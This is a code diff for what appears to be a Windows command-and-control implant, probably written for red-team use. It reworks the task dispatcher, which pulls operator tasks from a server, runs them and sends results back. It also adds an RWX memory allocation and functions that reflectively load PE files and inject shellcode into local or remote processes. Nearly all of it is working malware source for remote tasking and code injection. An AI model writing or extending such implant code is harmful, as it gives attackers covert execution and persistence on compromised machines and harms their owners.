@@ -5,16 +5,20 @@ using namespace Root;
 auto DECLFN Task::Dispatcher(
     VOID
 ) -> VOID {
+    KhDbg( "[====== Starting Dispatcher ======]" );
+
+    KhDbg( "heap allocation count: %d", Self->Hp->Count );
+
     PPACKAGE Package  = Self->Pkg->NewTask();
     PPACKAGE PostJobs = Self->Pkg->PostJobs();
     PPARSER  Parser   = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );
 
     ULONG TaskCode = 0;
-    INT16 TaskID = 0;
+    INT16 TaskID   = 0;
     PCHAR TaskUUID = NULL;
-    BYTE JobID = 0;
-    BOOL TaskBool = FALSE;
-    ULONG TaskQtt = 0;
+    BYTE  JobID    = 0;
+    BOOL  TaskBool = FALSE;
+    ULONG TaskQtt  = 0;
 
     PBYTE Buffer = NULL;
     ULONG Length = 0;
@@ -24,12 +28,19 @@ auto DECLFN Task::Dispatcher(
 
     KhDbg( "send %p [%d bytes]", Package->Buffer, Package->Length );
 
+    PVOID Address = Self->Mm->Alloc( NULL, NULL, 0x1000, 0x3000, 0x40 );
+    KhDbg( "allocated memory at %p", Address );
+
     Self->Pkg->Transmit( Package, &DataPsr, &PsrLen );
     KhDbg( "transmited return %p [%d bytes]", DataPsr, PsrLen );
     if ( !DataPsr || !PsrLen ) goto _KH_END;
 
+    KhDbg( "heap allocation count: %d", Self->Hp->Count );
+
     Self->Psr->NewTask( Parser, DataPsr, PsrLen );
-    if (!Parser->Original) goto _KH_END;
+    if ( !Parser->Original ) goto _KH_END;
+
+    KhDbg( "heap allocation count: %d", Self->Hp->Count );
 
     KhDbg( "parsed %p [%d bytes]", Parser->Buffer, Parser->Length );
 
@@ -40,7 +51,7 @@ auto DECLFN Task::Dispatcher(
         TaskQtt = Self->Psr->Int32( Parser );
         KhDbg("task quantity: %d", TaskQtt );
 
-        if ( !TaskQtt ) return;
+        if ( !TaskQtt ) goto _KH_END;
 
         Self->Pkg->Int32( PostJobs, TaskQtt );
 
@@ -58,40 +69,70 @@ auto DECLFN Task::Dispatcher(
 
         Self->Jbs->ExecuteAll();
         Self->Jbs->Send( PostJobs );
-        Self->Jbs->Cleanup();
     }
 
 _KH_END:
-    if ( Parser && !Self->Jbs->Count ) { 
+    Self->Jbs->Cleanup();
+
+    if ( PostJobs ) {
+        Self->Hp->Free( PostJobs );
+    }
+
+    if ( Parser ) { 
         Self->Psr->Destroy( Parser );
+    }
+    
+    if ( DataPsr ) {
+        Self->Hp->Free( DataPsr );
     }
 
     if ( Self->Pkg->Global ) {
         Self->Pkg->Destroy( Self->Pkg->Global );
-        Self->Pkg->Global = NULL;
     }
+
+    KhDbg( "heap allocation count: %d", Self->Hp->Count );
+    KhDbg( "[====== Exiting Dispatcher ======]\n" );
 }
 
-auto DECLFN Task::Injection(
+auto DECLFN Task::ExecPE(
     _In_ PJOBS Job
 ) -> ERROR_CODE {
     PPACKAGE Package = Job->Pkg;
     PPARSER  Parser  = Job->Psr;
 
-    ULONG    Type    = Self->Psr->Int32( Parser );
-    ULONG    BuffLen = 0;
-    ULONG    ArgLen  = 0;
-    PBYTE    Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
-    PBYTE    Args    = Self->Psr->Bytes( Parser, &ArgLen );
-    BOOL     Success = FALSE; 
+    ULONG BuffLen = 0;
+    ULONG ArgLen  = 0;
+    PBYTE Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
+    PBYTE Args    = Self->Psr->Bytes( Parser, &ArgLen );
+    BOOL  Success = FALSE; 
 
-    if ( Type == KH_INJECTION_SC ) {
-        Self->Inj->Shellcode( Buffer, BuffLen );
-    } else if ( Type == KH_INJECTION_PE ) {
-        return KH_ERROR_INVALID_INJECTION_ID;
-    } 
+    Self->Inj->Reflection( Buffer, BuffLen, Args );
 
-    if ( GLOBAL_PKG ) GLOBAL_PKG = NULL;
+    return KhGetError;
+}
+
+auto DECLFN Task::ExecSc(
+    _In_ PJOBS Job
+) -> ERROR_CODE {
+    PPACKAGE Package = Job->Pkg;
+    PPARSER  Parser  = Job->Psr;
+
+    ULONG ProcID  = Self->Psr->Int32( Parser );
+    ULONG BuffLen = 0;
+    ULONG ArgLen  = 0;
+    PBYTE Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
+    PBYTE Args    = Self->Psr->Bytes( Parser, &ArgLen );
+    BOOL  Success = FALSE; 
+
+    KhDbg( "inject %p [%d bytes] into %s process", Buffer, BuffLen, ProcID ? "remote":"local" );
+
+    Success = Self->Inj->Shellcode( ProcID, Buffer, BuffLen, Args );
+
+    if ( Success ) {
+        return ERROR_SUCCESS;
+    } else {
+        return KhGetError;
+    }
 }
 
 auto DECLFN Task::Download(
